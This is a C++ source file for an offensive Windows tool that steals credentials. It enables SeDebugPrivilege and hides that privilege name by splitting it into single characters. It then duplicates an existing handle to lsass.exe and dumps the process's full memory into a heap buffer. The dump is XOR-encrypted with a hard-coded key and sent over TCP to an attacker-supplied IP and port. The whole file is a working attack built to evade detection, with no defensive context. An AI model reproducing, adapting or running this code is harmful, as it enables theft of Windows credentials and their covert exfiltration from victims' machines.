#include "header.h"
/*
Credits to dec0ne and Sektor7 or some of the source code.
https://dec0ne.github.io/2022-11-14-Undetected-Lsass-Dump-Workflow/
Furthermore, thanks some creative posts on Unknownchets.me that helped me understand some of the NTAPI calls.
*/

BOOL SetDebugPrivilege() {
	HANDLE hToken = NULL;
	TOKEN_PRIVILEGES TokenPrivileges = { 0 };

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken)) {
		printf("[-] Could not get current process token with TOKEN_ADJUST_PRIVILEGES\n");
		return FALSE;
	}

	TokenPrivileges.PrivilegeCount = 1;
	TokenPrivileges.Privileges[0].Attributes = TRUE ? SE_PRIVILEGE_ENABLED : 0;

	char sPriv[] = { 'S','e','D','e','b','u','g','P','r','i','v','i','l','e','g','e',0 };

	if (!LookupPrivilegeValueA(NULL, (LPCSTR)sPriv, &TokenPrivileges.Privileges[0].Luid)) {
		CloseHandle(hToken);
		printf("[-] No SeDebugPrivs. Make sure you are an admin\n");
		return FALSE;
	}

	if (!AdjustTokenPrivileges(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
		CloseHandle(hToken);
		printf("[-] Could not adjust to SeDebugPrivs\n");
		return FALSE;
	}

	CloseHandle(hToken);
	return TRUE;
}

std::vector<HANDLE> enum_handles(PSYSTEM_HANDLE_INFORMATION handleInfo) {
	std::vector<HANDLE> handles;
	ULONG i;
	HANDLE processHandle;
	_NtDuplicateObject NtDuplicateObject =
		(_NtDuplicateObject)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtDuplicateObject");

	_NtQueryObject NtQueryObject =
		(_NtQueryObject)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryObject");
	for (i = 0; i < handleInfo->HandleCount; i++) {
		SYSTEM_HANDLE handle = handleInfo->Handles[i];
		HANDLE dupHandle = NULL;
		POBJECT_TYPE_INFORMATION objectTypeInfo;
		processHandle = OpenProcess(PROCESS_DUP_HANDLE, FALSE, handle.ProcessId);
		if (processHandle == NULL) {
			continue;
		}

		if (!NT_SUCCESS(NtDuplicateObject(processHandle, (HANDLE)handle.Handle, GetCurrentProcess(), &dupHandle, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, 0, 0)))
		{
			CloseHandle(processHandle);
			CloseHandle(dupHandle);
			continue;
		}

		objectTypeInfo = (POBJECT_TYPE_INFORMATION)malloc(0x1000);
		if (!NT_SUCCESS(NtQueryObject(dupHandle, ObjectTypeInformation, objectTypeInfo, 0x1000, NULL)))
		{
			free(objectTypeInfo);
			CloseHandle(dupHandle);
			CloseHandle(processHandle);
			continue;
		}

		// Only serach for handles of the type Process
		if (wcscmp(objectTypeInfo->Name.Buffer, (PWSTR)"Process")) {
			wchar_t processImageFileName[MAX_PATH];
			DWORD processImageFileNameSize = MAX_PATH;
			if (QueryFullProcessImageNameW(dupHandle, 0, processImageFileName, &processImageFileNameSize))
			{
				if (wcsstr(processImageFileName, L"lsass.exe")) {
					wprintf(L"[-] Handle found \nProcess Image File Name: %s, Type: %s\n", processImageFileName, objectTypeInfo->Name.Buffer);
					printf("-------------------------------------------------------\n");
					handles.push_back(dupHandle);
				}
			}
		}
	}

	return handles;
}
// global var to hold the dump data and size
LPVOID dumpingBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 * 1024 * 200); // Allocate 200MB buffer on the heap <- TODO Adjust if dump size is bigger
DWORD dumpSize = 0;
// Callback routine that we be called by the MiniDumpWriteDump function
BOOL CALLBACK DumpCallbackRoutine(PVOID CallbackParam, const PMINIDUMP_CALLBACK_INPUT CallbackInput, PMINIDUMP_CALLBACK_OUTPUT CallbackOutput) {
	LPVOID destination = 0;
	LPVOID source = 0;
	DWORD bufferSize = 0;
	switch (CallbackInput->CallbackType) {
	case IoStartCallback:
		CallbackOutput->Status = S_FALSE;
		printf("[+] Starting dump to memory buffer\n");
		break;
	case IoWriteAllCallback:
		// Buffer holding the current chunk of dump data
		source = CallbackInput->Io.Buffer;

		// Calculate the memory address we need to copy the chunk of dump data to based on the current dump data offset
		destination = (LPVOID)((DWORD_PTR)dumpingBuffer + (DWORD_PTR)CallbackInput->Io.Offset);

		// Size of the current chunk of dump data
		bufferSize = CallbackInput->Io.BufferBytes;

		// Copy the chunk data to the appropriate memory address of our allocated buffer
		RtlCopyMemory(destination, source, bufferSize);
		dumpSize += bufferSize; // Incremeant the total size of the dump with the current chunk size

		CallbackOutput->Status = S_OK;
		break;
	case IoFinishCallback:
		CallbackOutput->Status = S_OK;
		printf("[+] Copied %i bytes to memory buffer\n", dumpSize);
		break;
	}
	return TRUE;
}

bool SendBuffer(LPVOID dumpBuffer, DWORD dumpSize, CHAR* IP, INT PORT) {
	// Initialize Winsock
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);

	// Create a socket
	SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, 0);
	if (clientSocket == INVALID_SOCKET) {
		WSACleanup();
		return false;
	}

	// Define the server address
	sockaddr_in serverAddr;
	serverAddr.sin_family = AF_INET;
	serverAddr.sin_port = htons(PORT); // Set the port here
	InetPtonA(AF_INET, IP, &serverAddr.sin_addr); // Set the IP address here
	// Connect to the server
	connect(clientSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr));

	// Send the buffer
	int bytesSent = send(clientSocket, static_cast<char*>(dumpBuffer), dumpSize, 0);
	if (bytesSent == SOCKET_ERROR) {
		closesocket(clientSocket);
		WSACleanup();
		return false;
	}
	printf("[+] %d bytes send", bytesSent);
	// Clean up and close the socket
	closesocket(clientSocket);
	WSACleanup();

	return true;
}

// Simple xor routine on memory buffer
void XOR(char* data, int data_len, char* key, int key_len)
{
	int j = 0;
	for (int i = 0; i < data_len; i++) {
		if (j == key_len - 1)
			j = 0;
		data[i] = data[i] ^ key[j];
		j++;
	}
}

int main(int argc, char** argv) {
	// take in arguments
	if (argc != 3) {
		printf("Usage: LsassDuplicateHandle.exe <IP> <PORT>");
	}

	char* IP = argv[1];
	int PORT = atoi(argv[2]);

	if (!SetDebugPrivilege())
		return FALSE;

	/* Import functions manually TODO Hashing */
	_NtQuerySystemInformation NtQuerySystemInformation =
		(_NtQuerySystemInformation)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");

	/* Variables used for retrieving handles */

	NTSTATUS status;
	ULONG handleInfoSize = 0x10000;
	PSYSTEM_HANDLE_INFORMATION handleInfo;

	handleInfoSize = 0x10000;
	handleInfo = (PSYSTEM_HANDLE_INFORMATION)malloc(handleInfoSize);
	//NtQuerySystemInformation

	/* NtQuerySystemInformation won't give us the correct buffer size, so we guess by doubling the buffer size. */
	while ((status = NtQuerySystemInformation(SystemHandleInformation, handleInfo, handleInfoSize, NULL)) == STATUS_INFO_LENGTH_MISMATCH)
		handleInfo = (PSYSTEM_HANDLE_INFORMATION)realloc(handleInfo, handleInfoSize *= 2);

	/* NtQuerySystemInformation stopped giving us STATUS_INFO_LENGTH_MISMATCH. */
	if (!NT_SUCCESS(status))
	{
		printf("NtQuerySystemInformation failed!\n");
		return 1;
	}

	std::vector<HANDLE> handles = enum_handles(handleInfo);

	for (const HANDLE& handle : handles) {
		MINIDUMP_CALLBACK_INFORMATION CallbackInfo = { 0 };
		CallbackInfo.CallbackRoutine = DumpCallbackRoutine;

		BOOL ret = MiniDumpWriteDump(handle, 0, NULL, MiniDumpWithFullMemory, NULL, NULL, &CallbackInfo);
		if (ret) {
			printf("[+] Successfully dumped  to memory!\n");
		}
		else {
			printf("[-] Could not dump  to memory\n[-] Error Code: %i\n", GetLastError());
			return 0;
		}
		char key[] = "quackquack123";
		printf("[+] Xor encrypting the memory buffer containing the dump data\n[+] Xor key: %s\n", key);
		XOR((char*)dumpingBuffer, dumpSize, key, sizeof(key));
		SendBuffer(dumpingBuffer, dumpSize, IP, PORT);
		break;
	}

}




